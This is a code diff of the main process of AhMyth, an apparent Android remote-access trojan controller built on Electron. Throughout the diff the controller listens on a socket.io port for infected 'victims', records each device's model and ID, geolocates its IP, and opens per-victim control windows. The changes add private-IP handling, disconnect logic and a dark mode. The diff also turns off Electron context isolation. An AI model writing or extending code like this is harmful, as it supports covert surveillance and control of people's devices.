@@ -1,9 +1,10 @@
-const { app, BrowserWindow } = require('electron')
-const electron = require('electron');
+const { app, BrowserWindow, dialog, screen } = require('electron');
 const { ipcMain } = require('electron');
+const { initialize, enable } = require('@electron/remote/main');
+const { nativeTheme } = require('electron/main');
+const victimsList = require('./app/assets/js/model/Victim');
 var io = require('socket.io');
-var geoip = require('geoip-lite');
-var victimsList = require('./app/assets/js/model/Victim');
+var geoip = require('geoip-lite2');
 module.exports = victimsList;
 //--------------------------------------------------------------
 let win;
@@ -12,13 +13,12 @@ var windows = {};
 const IOs = {};
 //--------------------------------------------------------------
 
+initialize();
+
 function createWindow() {
 
-
   // get Display Sizes ( x , y , width , height)
-  display = electron.screen.getPrimaryDisplay();
-
-
+  display = screen.getPrimaryDisplay();
 
   //------------------------SPLASH SCREEN INIT------------------------------------
   // create the splash window
@@ -26,7 +26,6 @@ function createWindow() {
     width: 700,
     height: 500,
     frame: false,
-    transparent: true,
     icon: __dirname + '/app/assets/img/icon.png',
     type: "splash",
     alwaysOnTop: true,
@@ -38,24 +37,36 @@ function createWindow() {
     webPreferences: {
       nodeIntegration: true,
       enableRemoteModule: true,
+      contextIsolation: false
     }
   });
-
 
   // load splash file
   splashWin.loadFile(__dirname + '/app/splash.html');
 
   splashWin.webContents.on('did-finish-load', function () {
-    splashWin.show(); //close splash
-  });
+    splashWin.show(); // Show splash screen
 
+    // 32bit Arch Check and deprecation message
+    setTimeout(() => {
+      const architecture = process.arch;
+      if (architecture === 'ia32') {
+        // If not 64-bit architecture, show message box
+        dialog.showMessageBoxSync(splashWin, {
+          type: 'info',
+          title: 'Architecture Check',
+          message: 'AhMyth will soon be dropping support for Operating Systems running 32bit Architecture, sorry for any inconvenience.',
+          buttons: ['OK']
+        });
+      }
+    }, 500); // Adjust the delay as needed
+  });
 
   // Emitted when the window is closed.
   splashWin.on('closed', () => {
     // Dereference the window object
     splashWin = null
   })
-
 
   //------------------------Main SCREEN INIT------------------------------------
   // Create the browser window.
@@ -68,17 +79,19 @@ function createWindow() {
     position: "center",
     toolbar: false,
     fullscreen: false,
-    transparent: true,
     frame: false,
     webPreferences: {
       nodeIntegration: true,
-      enableRemoteModule: true
+      enableRemoteModule: true,
+      contextIsolation: false,
     }
   });
 
   win.loadFile(__dirname + '/app/index.html');
-  //open dev tools
-  //win.webContents.openDevTools()
+
+  enable(win.webContents);
+
+  win.webContents.openDevTools();
 
   // Emitted when the window is closed.
   win.on('closed', () => {
@@ -86,23 +99,21 @@ function createWindow() {
     // in an array if your app supports multi windows, this is the time
     // when you should delete the corresponding element.
     win = null
-  })
+  });
 
   // Emitted when the window is finished loading.
   win.webContents.on('did-finish-load', function () {
     setTimeout(() => {
-      splashWin.close(); //close splash
-      win.show(); //show main
+      splashWin.close(); // Close splash screen
+      win.show(); // Show main UI
     }, 2000);
   });
 }
 
-
-
 // This method will be called when Electron has finished
 // initialization and is ready to create browser windows.
 // Some APIs can only be used after this event occurs.
-app.on('ready', createWindow)
+app.on('ready', createWindow);
 
 // Quit when all windows are closed.
 app.on('window-all-closed', () => {
@@ -111,7 +122,7 @@ app.on('window-all-closed', () => {
   if (process.platform !== 'darwin') {
     app.quit()
   }
-})
+});
 
 app.on('activate', () => {
   // On macOS it's common to re-create a window in the app when the
@@ -119,16 +130,33 @@ app.on('activate', () => {
   if (win === null) {
     createWindow()
   }
+});
+
+// handle the dark mode toggle
+ipcMain.handle('dark-mode:toggle', () => {
+  if (nativeTheme.shouldUseDarkColors) {
+    nativeTheme.themeSource = 'light'
+  } else {
+    nativeTheme.themeSource = 'dark'
+  }
+  return nativeTheme.shouldUseDarkColors
 })
 
-
+ipcMain.handle('dark-mode:system', () => {
+  nativeTheme.themeSource = 'system'
+})
 
 //handle the Uncaught Exceptions
 
+// Function to check if the extracted victim IP is private or public
+function isPrivateIP(ip) {
+  return /^10\./.test(ip) ||
+    /^192\.168\./.test(ip) ||
+    /^172\.(1[6-9]|2[0-9]|3[0-1])\./.test(ip);
+}
 
-
-
-const listeningStatus = {}; // Object to track listening status for each port
+// Global Object to track listening status for each port
+const listeningStatus = {};
 
 ipcMain.on('SocketIO:Listen', function (event, port) {
   if (listeningStatus[port]) {
@@ -142,20 +170,53 @@ ipcMain.on('SocketIO:Listen', function (event, port) {
   IOs[port].sockets.pingInterval = 10000;
   IOs[port].sockets.pingTimeout = 10000;
 
-
   IOs[port].sockets.on('connection', function (socket) {
     var address = socket.request.connection;
     var query = socket.handshake.query;
     var index = query.id;
-    var ip = address.remoteAddress.substring(address.remoteAddress.lastIndexOf(':') + 1);
+
+    // Extract IP address of the connected victim(s) + handle both IPv4 and IPv6 formats
+    var ip = address.remoteAddress;
+    if (ip.includes(':')) {
+      ip = ip.substring(ip.lastIndexOf(':') + 1);
+    }
+
+    /* Set the counry as null for every connection
+    before obtaining the country of origin based on the victim's IP 
+    to avoid conflictions */
     var country = null;
-    var geo = geoip.lookup(ip); // check ip location
-    if (geo)
-      country = geo.country.toLowerCase();
+
+    // check if the extracted victim IP from an active connection is Private or Public
+    if (isPrivateIP(ip)) {
+
+      // If the IP is Private
+      const warningMessage = `[!] IP ${ip} is a private IP address! Private IP addresses cannot be Geolocated, skipping GeoIP lookup.`;
+      event.reply('SocketIO:GeoIPError', warningMessage);
+      event.sender.send('SocketIO:Log', warningMessage);
+    } else {
+
+      // if the IP is public 
+      // Check the IP location
+      var geo = geoip.lookup(ip);
+
+      // handle exceptions
+      if (geo) {
+        if (geo.country) {
+          country = geo.country.toLowerCase();
+        } else {
+          const warningMessage = `[!] GeoIP lookup returned no country for IP: ${ip}, Unable to determine the Victim's Country.`;
+          event.reply('SocketIO:GeoIPError', warningMessage);
+          event.sender.send('SocketIO:Log', warningMessage);
+        }
+      } else {
+        const warningMessage = `[!] GeoIP lookup failed for IP: ${ip}, Unable to determine the Victim's Country.`;
+        event.reply('SocketIO:GeoIPError', warningMessage);
+        event.sender.send('SocketIO:Log', warningMessage);
+      }
+    }
 
     // Add the victim to victimList
     victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id);
-
 
     //------------------------Notification SCREEN INIT------------------------------------
     // create the Notification window
@@ -170,7 +231,8 @@ ipcMain.on('SocketIO:Listen', function (event, port) {
       toolbar: false,
       webPreferences: {
         nodeIntegration: true,
-        enableRemoteModule: true
+        enableRemoteModule: true,
+        contextIsolation: false,
       }
     });
 
@@ -185,31 +247,43 @@ ipcMain.on('SocketIO:Listen', function (event, port) {
     notification.webContents.victim = victimsList.getVictim(index);
     notification.loadFile(__dirname + '/app/notification.html');
 
+    enable(notification.webContents);
 
-
-    //notify renderer proccess (AppCtrl) about the new Victim
+    // notify renderer process (AppCtrl) about the new Victim
     win.webContents.send('SocketIO:NewVictim', index);
 
     socket.on('disconnect', function () {
+      // Check if the disconnection was server-initiated
+      const isServerInitiated = IOs[port].sockets.serverInitiatedDisconnect;
+
       // Decrease the socket count on a disconnect
       victimsList.rmVictim(index);
 
-      //notify renderer proccess (AppCtrl) about the disconnected Victim
-      win.webContents.send('SocketIO:RemoveVictim', index);
-
-      if (windows[index]) {
-        //notify renderer proccess (LabCtrl) if opened about the disconnected Victim
-        BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:VictimDisconnected");
-        //delete the window from windowsList
-        delete windows[index]
+      // notify renderer process (AppCtrl) about the server disconnecting from the Victim
+      if (isServerInitiated) {
+        win.webContents.send('SocketIO:StopAndRemoveVictim', index);
+        IOs[port].sockets.serverInitiatedDisconnect = false; // reset the flag
+      } else {
+        // motify the render process (AppCtrl) about the Victim Disconnecting
+        win.webContents.send('SocketIO:RemoveVictim', index);
       }
 
-      //notify renderer proccess (LabCtrl) if opened about the Server Disconnecting
       if (windows[index]) {
-        BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:ServerDisconnected");
-        // delete the window from the winowsList
-        delete windows[index]
-      }
+        if (isServerInitiated) {
+          // notify renderer process (LabCtrl) if opened about the Stop Button being clicked 
+          // effectively disconnecting the server from the client 
+          BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:ServerTerminated");
+
+          // delete the window from the windowsList
+          delete windows[index]
+        } else {
+          // notify renderer process (LabCtrl) if opened about the disconnected Victim
+          BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:VictimDisconnected");
+
+          // delete the window from windowsList
+          delete windows[index]
+        };
+      };
     });
   });
 
@@ -219,9 +293,23 @@ ipcMain.on('SocketIO:Listen', function (event, port) {
 
 ipcMain.on('SocketIO:Stop', function (event, port) {
   if (IOs[port]) {
+    const sockets = IOs[port].sockets.sockets;
+    const hasActiveConnections = Object.keys(sockets).length > 0;
+
+    // Set the flag to indicate server-initiated disconnection if there are active connections
+    if (hasActiveConnections) {
+      IOs[port].sockets.serverInitiatedDisconnect = true;
+    }
+
     IOs[port].close();
     IOs[port] = null;
-    event.reply('SocketIO:Stop', '[✓] Stopped listening on Port: ' + port);
+
+    if (hasActiveConnections) {
+      win.webContents.send('SocketIO:ServerDisconnectMessage');
+    } else {
+      event.reply('SocketIO:Stop', '[✓] Stopped Listening on Port: ' + port);
+    }
+
     listeningStatus[port] = false; // Update listening status for the specific port
   } else {
     event.reply('SocketIO:StopError', '[x] The Server is not Currently Listening on Port: ' + port);
@@ -232,7 +320,8 @@ process.on('uncaughtException', function (error) {
   if (error.code == "EADDRINUSE") {
     win.webContents.send('SocketIO:ListenError', "Address Already in Use");
   } else {
-    electron.dialog.showErrorBox("ERROR", JSON.stringify(error));
+    dialog.showErrorBox("ERROR", JSON.stringify(error));
+    console.log(error);
   }
 });
 
@@ -244,20 +333,21 @@ ipcMain.on('openLabWindow', function (e, page, index) {
     icon: __dirname + '/app/assets/img/icon.png',
     parent: win,
     width: 700,
-    height: 750,
+    height: 690,
     show: false,
-    darkTheme: true,
-    transparent: true,
     resizable: false,
     frame: false,
     webPreferences: {
       nodeIntegration: true,
-      enableRemoteModule: true
+      enableRemoteModule: true,
+      contextIsolation: false,
     }
   })
 
   //add this window to windowsList
   windows[index] = child.id;
+
+  enable(child.webContents);
   //child.webContents.openDevTools();
 
   // pass the victim info to this victim lab
